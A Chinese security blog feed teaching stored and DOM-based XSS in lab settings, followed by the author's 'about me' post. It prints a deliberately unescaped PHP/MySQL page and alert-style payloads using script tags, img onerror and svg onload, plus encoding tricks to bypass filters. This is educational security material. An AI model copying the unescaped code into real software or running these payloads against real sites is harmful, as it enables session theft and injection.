        <content type="html"><![CDATA[<h1 id="0x01-存储型xss"><a href="#0x01-存储型xss" class="headerlink" title="0x01.存储型xss"></a>0x01.存储型xss</h1><hr><p><strong>1. 什么是存储型xss？</strong></p><blockquote><p>攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。只要访问了这个页面的访客，都有可能会执行这段恶意脚本<br>（因此储存型XSS的危害会更大。因为存储型XSS的代码存在于网页的代码中，可以说是永久型的）</p></blockquote><p><strong>2. 源码剖析</strong><br>这里直接贴出php源码</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gbk<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>存储型<span class="token constant">XSS</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        输入你的<span class="token constant">ID</span>：  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>        输入你的Name：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"insert into xss value ($id,'$name')"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span>        <span class="token keyword">echo</span> <span class="token string">"回显内容："</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select * from xss where id=1"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>可以看到的是，先在第一段部分，接受用户的内容，第二段是将内容插入<br>数据库，第三个回显内容就是从数据库查询。<br>（其实那2个php可以合成一个php，但是我不想，懒得）<br>具体内容我在反射型xss已经讲过了，可以狭义的概述</p><blockquote><p><code>存储型xss</code>：<strong>用户输入内容插入了数据库，内存，文件等其他地方。然后再次访问的时候没有输入payload，就会自动弹窗</strong><br>（例如留言板，或者个人资料修改。第一次插入后，连续访问还自动弹窗，说明这就是存储型xss）</p><p><code>反射型xss</code>：<strong>用户想要利用，就得输入一次payload</strong> （例如在搜索处发现xss，想要让他弹窗，就得重新输入一遍）</p></blockquote><p><strong>3. 靶场演示</strong><br>通过源码，我们知道这是这是输出xss表中的内容<br>我们先看下xss表有没有内容<br><img src="https://img-blog.csdnimg.cn/20200317113852628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""><br>发现没有内容，这时候我们进入靶场先插入id和name<br><img src="https://img-blog.csdnimg.cn/20200317113948174.png" alt="在这里插入图片描述"><br>然后会输出我们的名字<br><img src="https://img-blog.csdnimg.cn/20200317114029746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""><br>这时候就成功的输出了，我们查看下xss这个表中有没有内容<br><img src="https://img-blog.csdnimg.cn/20200317114118487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时候发现有条内容了。说明我们插入，或者我们平时注册的时候<br>会插入数据库等等，一般在网站后台可以看到</p><blockquote><p>我应该把上面的第三个php输出内容的代码单独拿出来，模拟管理员访问的页面 QAQ 但是写到这里了，我也不想弄，大概理解个意思就好了</p></blockquote><p>然后我把xss表内容删除掉，插入我们恶意语句的代码<br><img src="https://img-blog.csdnimg.cn/20200317114930473.png" alt="在这里插入图片描述"><br>payload：<code>&lt;script&gt;alert(\&#39;Young\&#39;)&lt;/script&gt;</code><br>这是提交，发现弹窗了<br><img src="https://img-blog.csdnimg.cn/20200317115039712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注意这里为啥没有回显内容，因为他把我们输入的内容当做代码执行了，所以没有显示<br>（你见过执行的代码会显示给用户嘛 QAQ）<br><img src="https://img-blog.csdnimg.cn/20200317115153286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时候发现数据库有了一条数据，那就是我们插入的数据<br>恶意的js语句<br>这种存储型xss漏洞存在于，留言板，个人资料等等<br>因为会保存进数据库，然后在后台显示，所以后台管理员只要看到这条信息<br>他就中招了</p><blockquote><p>至于会不会被发现，这个就不用担心，内容会被当做代码执行，所以不会显示的</p></blockquote><p>我们可以查看一下掌控安全的靶场<br><img src="https://img-blog.csdnimg.cn/20200317115651421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时候点击一下查看留言，因为好多人都会在这里插<br>（你也可以在留言反馈那边弹一条）<br><img src="https://img-blog.csdnimg.cn/20200317115807285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然而也不知道是谁在这插，插这么多，我点不完。所以就不演示了</p><h1 id="0x02-Dom型xss"><a href="#0x02-Dom型xss" class="headerlink" title="0x02.Dom型xss"></a>0x02.Dom型xss</h1><hr>**什么是 dom—based xss？**`狭义的总结`：原本不应该出现xss的地方，但是经过javascript的操作之后产生了xss<p>这里涉及到了document对象的一些操作，看过前面偏移注入的话应该知道<br><code>document.cookie</code>  这样的话就是查看自己的cookie<br><img src="https://img-blog.csdnimg.cn/20200317141516218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""><br>这里的话也可以使用下面这条命令，判断是否伪静态<br>如果使用这条的话，时间再不断的变化，就是动态</p><p><code>document.lastModifiled</code></p><p>还有其他的一些方法<br><img src="https://img-blog.csdnimg.cn/20200317142919710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里具体讲<code>document.write()</code><br>这个有啥用？<br>其实就是在页面上面输出<br><img src="https://img-blog.csdnimg.cn/20200317143505236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先判断下是不是动态页面，然后再写<br><code>document.write(&quot;young&quot;)</code><br>要write什么可以自己定义<br><img src="https://img-blog.csdnimg.cn/20200317143432531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然而上面提到了，其实这个write() 也是个js语句<br>接受编码，那我们试着将下面这个编码，看会不会弹窗<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20200317144009626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""><br>编码后再使用document.write()写入<br><img src="https://img-blog.csdnimg.cn/20200317144052305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""><br>发现这里弹窗了<del>~<br>我们通过js编码后，它成功的弹窗了<br>（但是这个不是漏洞，这里想说的是，像document.write() 会自动对编码进行解码</del>）</p><p>似乎扯的有点远了，但是如果被拦截了<br>这里可以通过Js代码的解码，去进行绕过 QAQ<br>然而xss的时候，也可以使用burp<br>因为有可能前端有限制，但是数据包没有</p><p>例如还有比较偏的，在上传头像的地方打xss QAQ</p><h2 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h2><p>这里的话借用靶场，因为我觉得这个靶场很容易讲的话很容易理解<br><img src="https://img-blog.csdnimg.cn/20200317152317345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""><br>通过审查源码，我们可以发现，这里是document.write()进行输出到页面上的<br>这时候我们可以尝试的，也在这个页面弹窗，通过修改发现，这个输入点是在url那边<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>这时候发现，似乎没有弹窗<br><img src="https://img-blog.csdnimg.cn/20200317152801970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但是注意看，我们输入的内容，已经被<code>&lt;script&gt;</code>给包围了<br>这时候我们用其他的语句测试<br><code>&lt;img src=a onerror=alert(1) /&gt;</code><br><img src="https://img-blog.csdnimg.cn/20200317152957637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时候成功的弹窗了，说明了我们输入的内容被执行了<br>可以简单理解成，标签内不可以使用<code>&lt;script&gt;</code></p><p>其他常用的弹窗语句<br>1.<code>&lt;img src=a onerror=alert(1) &gt;</code><br>2.<code>&lt;svg onload=alert(1)&gt;</code><br>这几个是我经常用的</p><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>dom型xss其实本质上还是反射型xss，他没有与数据库交互，没次想要弹窗，都需要输入一次payload<br>对dom型xss没有深入了解</p><p>啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊<br><img src="https://img-blog.csdnimg.cn/20200317153445786.png" alt="尴尬"></p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Who are Young?</title>
      <link href="/2020/03165880.html"/>
      <url>/2020/03165880.html</url>
      
        <content type="html"><![CDATA[<h3 id="在下尘世中的一届小白，辣鸡中的战斗机"><a href="#在下尘世中的一届小白，辣鸡中的战斗机" class="headerlink" title="在下尘世中的一届小白，辣鸡中的战斗机"></a>在下尘世中的一届小白，辣鸡中的战斗机</h3><p>在安全圈内的一个混子选手，打王者也是王者里面的混子</p><p>所以只能不断的去论坛学习学习，但是没办法，我就是个靓仔<br><img src="https://img-blog.csdnimg.cn/20200316174518780.jpg" alt="这是靓仔"><br>———————————————————————————————————————————————————</p><h2 id="关于我这个战斗机的简介"><a href="#关于我这个战斗机的简介" class="headerlink" title="关于我这个战斗机的简介"></a>关于我这个战斗机的简介</h2><p><code>ID</code>：Young，youngboy<br><code>职业</code>：无QAQ<br><code>性格</code>：外冷内也冷，比较内向<br><code>住址</code>：福建莆田内，啷个哩个啷<br><code>喜欢看的剧</code>：我在未来等你，大唐女法医<br><code>喜欢的游戏</code>：也就一个王者荣耀吧（鄙人就是小学生）<br><code>其他爱好</code>：打游戏，看书，游泳，听歌<br><code>一些经历</code>：也就挖过洞，在各大src飘荡不小心上了个榜。然后就没啥了吧<br><code>为什么做安全</code>：做安全只是为了兴趣，简单就是装逼。小时候电影看多了趴<br>              做安全为兴趣的同时也赚点钱不然就吃土了</p><p>———————————————————————————————————————————————————</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>你问我爱你有多深，我也不知道该咋写了。蹭个免费博客玩<br>（不要问我为什么，问就是没钱）</p><p>预计发展方向：二进制<del>~</del></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
